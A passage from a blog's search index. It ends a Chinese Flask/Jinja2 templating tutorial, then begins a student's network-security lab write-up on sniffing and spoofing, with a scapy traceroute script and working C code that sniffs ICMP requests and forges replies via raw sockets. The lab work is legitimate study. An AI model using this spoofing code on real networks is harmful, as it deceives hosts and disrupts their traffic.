class=&quot;important&quot;&gt;</span><br><span class="line">      Welcome to my awesome homepage.</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>在子模板的开头定义了<code>&#123;% extend 'base.html' %&#125;</code>语句来声明继承，此后在子模板中由<code>&#123;% block block_name %&#125;`和`&#123;% endblock %&#125;</code>所包括的语句块，将会替换父模板中同样由<code>&#123;% block block_name %&#125;`和`&#123;% endblock %&#125;</code>所包括的部分。</p><ul><li>模板不支持多继承，也就是子模板中定义的块，不可能同时被两个父模板替换。</li><li>模板中不能定义多个同名的块，子模板和父模板都不行，因为这样无法知道要替换哪一个部分的内容。</li><li>建议在<code>endblock</code>关键字后也加上块名，比如<code>&#123;% endblock block_name %&#125;</code>。可提高程序可读性。</li><li>若不希望父模板中的块被子模板替换，可在子模版的块中使用<code>&#123;&#123; super() &#125;&#125;</code>。</li><li>默认情况下，块内语句是无法访问块外作用域中的变量。如果想在块内访问块外的变量，需要在块声明时添加<code>scoped</code>关键字：<code>&#123;% block block_name scoped %&#125;&#123;% endblock %&#125;</code></li></ul><h4 id="2-6-include"><a href="#2-6-include" class="headerlink" title="2.6 include"></a>2.6 include</h4><p><code>include</code>用于实现代码重用的功能。通过<code>&#123;% include %&#125;</code>语句，可以将另一个模板加载到当前模板中，并直接渲染在当前位置上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &#x27;header.html&#x27; %&#125;</span><br><span class="line">    Body</span><br><span class="line">&#123;% include &#x27;footer.html&#x27; %&#125;</span><br></pre></td></tr></table></figure><p>当”include”的模板文件不存在时，程序会抛出异常。可以加上”ignore missing”关键字，这样如果模板不存在，就会忽略这段<code>&#123;% include %&#125;</code>语句。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include <span class="string">&#x27;footer.html&#x27;</span> ignore missing %&#125;</span><br></pre></td></tr></table></figure><p><code>&#123;% include %&#125;</code>语句还可以跟一个模板列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include [<span class="string">&#x27;footer.html&#x27;</span>,<span class="string">&#x27;bottom.html&#x27;</span>,<span class="string">&#x27;end.html&#x27;</span>] ignore missing %&#125;</span><br></pre></td></tr></table></figure><p>上例中，程序会按顺序寻找模板文件，第一个被找到的模板即被加载，而其后的模板都会被忽略。如果都没找到，那整个语句都会被忽略。</p><h4 id="2-7-import"><a href="#2-7-import" class="headerlink" title="2.7 import"></a>2.7 import</h4><p>一个模版中定义的[宏(macro)](#2.4 宏)可以被不同的模板使用，因此可以将其声明在一个单独的模板文件中。需要使用时<code>import</code>进行导入。</p><p><code>import</code>的语法类似于python中的import</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import &#x27;form.html&#x27; as form %&#125;</span><br><span class="line">&lt;p&gt;&#123;&#123; form.input(&#x27;username&#x27;, value=&#x27;user&#x27;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; form.input(&#x27;password&#x27;, &#x27;password&#x27;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; form.input(&#x27;submit&#x27;, &#x27;submit&#x27;, &#x27;Submit&#x27;) &#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% from &#x27;form.html&#x27; import input %&#125;</span><br><span class="line">&lt;p&gt;&#123;&#123; input(&#x27;username&#x27;, value=&#x27;user&#x27;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; input(&#x27;password&#x27;, &#x27;password&#x27;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; input(&#x27;submit&#x27;, &#x27;submit&#x27;, &#x27;Submit&#x27;) &#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="3-上下文"><a href="#3-上下文" class="headerlink" title="3. 上下文"></a>3. 上下文</h3><p>在Flask应用中的模板可以使用到请求上下文中的环境变量，及一些辅助函数。</p><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; request.url &#125;&#125;</span><br></pre></td></tr></table></figure><p>上下文变量和函数都可以自定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from flask import current_app</span><br><span class="line"></span><br><span class="line">@app.context_processor</span><br><span class="line">def appinfo():</span><br><span class="line">    return dict(appname=current_app.name)</span><br></pre></td></tr></table></figure><p>函数用<code>@app.context_processor</code>装饰器修饰，它是一个上下文处理器，它的作用是在模板被渲染前运行其所修饰的函数，并将函数返回的字典导入到模板上下文环境中，与模板上下文合并。</p><p>自定义函数方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.context_processor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_current_time</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_time</span>(<span class="params">timeFormat=<span class="string">&quot;%b %d, %Y - %H:%M:%S&quot;</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> time.strftime(timeFormat)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(current_time=get_time)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Current Time is: &#123;&#123; current_time() &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Current Day is: &#123;&#123; current_time(&quot;%Y-%m-%d&quot;) &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-过滤器"><a href="#4-过滤器" class="headerlink" title="4. 过滤器"></a>4. 过滤器</h3><p>变量可以通过过滤器被修改。过滤器可以被认为是一种转换函数，使用过滤器利用的是管道符<code>|</code>。输入的参数就是其所修饰的变量，一些可选参数可以包含在括号中，返回的就是变量转换后的值。过滤器的使用举例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;&lt;p&gt;test&lt;/p&gt;&quot;|striptags|upper &#125;&#125;</span><br><span class="line">&#123;# striptags:去除标签，返回&quot;test&quot; #&#125;</span><br><span class="line">&#123;# upper:大写，返回&quot;TEST&quot; #&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; listx|join(&#x27;, &#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure><p>Jinja内置的过滤器如下图所示</p><p><img src="https://gitee.com/saying_yy/blog-image/raw/master/img/20210506092320.png" class="lazyload" data-srcset="https://gitee.com/saying_yy/blog-image/raw/master/img/20210506092320.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="avatar"></p><p>这些过滤器具体的作用可以参考<a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters">官方文档</a></p><p>同时，还可以使用自定义的过滤器。自定义过滤器可以通过两种方式实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 方式一，通过app.add_template_filter方法</span><br><span class="line">def list_reverse(li):</span><br><span class="line">    temp = list(li)</span><br><span class="line">    temp.reverse()</span><br><span class="line">    return temp</span><br><span class="line"></span><br><span class="line"># 第一个参数指定过滤器函数，第二个（可选）参数表示过滤器的名字，默认为函数名</span><br><span class="line">app.add_template_filter(list_reverse,&#x27;li_reverse&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 方式二，通过装饰器</span><br><span class="line"># filter_name参数可选，默认为函数名</span><br><span class="line">@app.template_filter(filter_name)</span><br><span class="line">def my_filter(args):</span><br><span class="line">    temp = list(args)</span><br><span class="line">    temp.reverse()</span><br><span class="line">    return temp</span><br></pre></td></tr></table></figure><p>随后可以使用自定义的过滤器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; listx|list_reverse &#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> jinja2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实践(二)第7、8次实验</title>
      <link href="2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5-%E4%BA%8C-%E7%AC%AC7%E3%80%818%E6%AC%A1%E5%AE%9E%E9%AA%8C/"/>
      <url>2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5-%E4%BA%8C-%E7%AC%AC7%E3%80%818%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="网络攻防实践-二-第7、8次实验"><a href="#网络攻防实践-二-第7、8次实验" class="headerlink" title="网络攻防实践(二)第7、8次实验"></a>网络攻防实践(二)第7、8次实验</h1><psw>攻防实践毁我青春</psw><p>经历了前几次<psw>极其无聊的</psw>攻防实践<psw>尤其是垃圾渗透测试</psw>，终于到了这次算是我较为感兴趣的攻防实践——嗅探与伪造/ARP缓存中毒。<del>碰巧这几天重构了自己的博客，顺手写进博客</del></p><h2 id="一、嗅探与伪造"><a href="#一、嗅探与伪造" class="headerlink" title="一、嗅探与伪造"></a>一、嗅探与伪造</h2><h3 id="1-1-scapy路由追踪"><a href="#1-1-scapy路由追踪" class="headerlink" title="1.1 scapy路由追踪"></a>1.1 scapy路由追踪</h3><p>目的是scapy实现路由追踪。实际上，有关路由追踪的常见方式有两种：</p><ul><li>linux/BSD/router/UNIX下的<code>traceroute</code>。向目的地址的某个端口（大于30000）发送UDP数据报。</li><li>windows下的<code>tracert</code>。向目的地址发送icmp回显请求数据报。</li></ul><p>当然本质上都是设置ttl=1发包，然后逐次增加ttl。通过接受到的icmp超时报文，获取路径上节点的ip地址。</p><p>指导书要求使用<code>icmp回显请求数据报</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># MAX_TTL = 64</span></span><br><span class="line">MAX_TTL = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_once</span>(<span class="params">dst, ttl</span>):</span></span><br><span class="line">    pkt = IP(dst=dst, ttl=ttl) / ICMP(<span class="built_in">type</span>=<span class="number">8</span>)</span><br><span class="line">    trace_reply = sr1(pkt, retry = <span class="number">1</span>, timeout = <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">if</span> trace_reply <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请求超时&quot;</span></span><br><span class="line">    <span class="keyword">return</span> trace_reply[<span class="string">&#x27;IP&#x27;</span>].src</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tracert</span>(<span class="params">dst</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ttl <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, MAX_TTL + <span class="number">1</span>):</span><br><span class="line">        src = ping_once(dst, ttl)</span><br><span class="line">        ans = <span class="string">&quot;&#123;&#125;: &#123;:^20&#125;&quot;</span>.<span class="built_in">format</span>(ttl, src)</span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line">        res += ans + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> src == dst:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;traceroute&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;dst&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;destination ip&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="built_in">print</span>(tracert(args.dst))</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note info"><p>可能有某些节点禁ping，或者是什么其他安全措施，导致请求超时，这是正常的。即使使用Windows自带的tracert也会出现这种情况</p></div><h3 id="1-2-伪造icmp响应报文"><a href="#1-2-伪造icmp响应报文" class="headerlink" title="1.2 伪造icmp响应报文"></a>1.2 伪造icmp响应报文</h3><p>目的是对嗅探的任意icmp请求报文做出回应，即使目标不是自己。这样，如果网络正常，目标主机在ping命令时，每发出一个icmp echo request，将收到两个icmp echo reply。</p><p>直接上代码吧（</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reply_icmp_pkt</span><span class="params">(struct ipheader *ip, struct icmpheader *icmp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">in_cksum</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *buf,<span class="keyword">int</span> length)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_raw_ip_packet</span><span class="params">(struct ipheader* ip)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">got_packet</span><span class="params">(u_char *args, <span class="keyword">const</span> struct pcap_pkthdr *header, <span class="keyword">const</span> u_char *packet)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> *<span class="title">eth</span>=</span>(struct ethheader *)packet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(eth-&gt;ether_type) == <span class="number">0x800</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (struct ipheader *)(packet + <span class="keyword">sizeof</span>(struct ethheader));</span><br><span class="line">        <span class="keyword">if</span> (ip-&gt;iph_protocol == IPPROTO_ICMP) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Got an ICMP packet\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;From: %s\n&quot;</span>,inet_ntoa(ip-&gt;iph_sourceip));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;To: %s\n&quot;</span>,inet_ntoa(ip-&gt;iph_destip));</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp</span> =</span> (struct icmpheader *)(packet + <span class="keyword">sizeof</span>(struct ethheader) + <span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line">            <span class="keyword">if</span> (icmp-&gt;icmp_type == <span class="number">8</span>) &#123;</span><br><span class="line">                reply_icmp_pkt(ip, icmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">pcap_t</span> *handle; </span><br><span class="line"><span class="keyword">char</span> errbuf[PCAP_ERRBUF_SIZE]; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span> </span><br><span class="line"><span class="keyword">char</span> filter_exp[] = <span class="string">&quot;ip proto icmp&quot;</span>; </span><br><span class="line">bpf_u_int32 net;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 1: Open live pcap session on NIC with interface name</span></span><br><span class="line">handle = pcap_open_live(<span class="string">&quot;docker0&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 2: Compile filter_exp into BPF psuedo-code </span></span><br><span class="line">pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net); </span><br><span class="line">pcap_setfilter(handle, &amp;fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 3: Capture packets </span></span><br><span class="line">pcap_loop(handle, <span class="number">-1</span>, got_packet, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pcap_close(handle); <span class="comment">//Close the handle </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reply_icmp_pkt</span><span class="params">(struct ipheader *ip, struct icmpheader *icmp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[PACKET_LEN];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, PACKET_LEN);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">reply_icmp</span>;</span></span><br><span class="line">    reply_icmp = (struct icmpheader *)(buffer + <span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">reply_ip</span>;</span></span><br><span class="line">    reply_ip = (struct ipheader *) buffer;</span><br><span class="line">    <span class="keyword">int</span> icmp_len = ntohs(ip-&gt;iph_len) - <span class="keyword">sizeof</span>(struct ipheader);</span><br><span class="line"><span class="built_in">memcpy</span>(reply_icmp, icmp, icmp_len);</span><br><span class="line"></span><br><span class="line">    reply_icmp-&gt;icmp_type = <span class="number">0</span>;</span><br><span class="line">    reply_icmp-&gt;icmp_chksum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">void</span> *temp = reply_icmp;</span><br><span class="line">    reply_icmp-&gt;icmp_chksum = in_cksum(temp, icmp_len);</span><br><span class="line">reply_ip-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">reply_ip-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">reply_ip-&gt;iph_tos = <span class="number">16</span>;</span><br><span class="line">reply_ip-&gt;iph_ident = htons(<span class="number">54321</span>);</span><br><span class="line">reply_ip-&gt;iph_ttl = <span class="number">64</span>;</span><br><span class="line">reply_ip-&gt;iph_sourceip.s_addr = ip-&gt;iph_destip.s_addr;</span><br><span class="line">reply_ip-&gt;iph_destip.s_addr = ip-&gt;iph_sourceip.s_addr;</span><br><span class="line">reply_ip-&gt;iph_protocol = IPPROTO_ICMP; <span class="comment">// The value is 1, representing ICMP.</span></span><br><span class="line">reply_ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(struct ipheader) + icmp_len);</span><br><span class="line"></span><br><span class="line">send_raw_ip_packet(reply_ip);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">in_cksum</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *buf,<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> *w = buf;</span><br><span class="line">        <span class="keyword">int</span> nleft = length;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> temp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * The algorithm uses a 32 bit accumulator (sum), adds</span></span><br><span class="line"><span class="comment">        * sequential 16 bit words to it, and at the end, folds back all the</span></span><br><span class="line"><span class="comment">        * carry bits from the top 16 bits into the lower 16 bits.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">while</span> (nleft &gt; <span class="number">1</span>)  &#123;</span><br><span class="line">                sum += *w++;</span><br><span class="line">                nleft -= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* treat the odd byte at the end, if any */</span></span><br><span class="line">        <span class="keyword">if</span> (nleft == <span class="number">1</span>) &#123;</span><br><span class="line">                *(u_char *)(&amp;temp) = *(u_char *)w ;</span><br><span class="line">                sum += temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* add back carry outs from top 16 bits to low 16 bits */</span></span><br><span class="line">        sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>);     <span class="comment">// add hi 16 to low 16 </span></span><br><span class="line">        sum += (sum &gt;&gt; <span class="number">16</span>);                     <span class="comment">// add carry </span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(~sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************************* </span></span><br><span class="line"><span class="comment">  Given an IP packet, send it out using raw socket. </span></span><br><span class="line"><span class="comment">*******************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_raw_ip_packet</span><span class="params">(struct ipheader* ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">    <span class="keyword">int</span> enable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a raw network socket, and set its options.</span></span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Provide needed information about destination.</span></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send the packet out.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sending spoofed IP packet...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sendto(sock,ip,ntohs(ip-&gt;iph_len),<span class="number">0</span>,(struct sockaddr *)&amp;dest_info,<span class="keyword">sizeof</span>(dest_info)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;PACKET NOT SENT\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n---------------------------------------------------\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   From: %s\n&quot;</span>,inet_ntoa(ip-&gt;iph_sourceip));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   To: 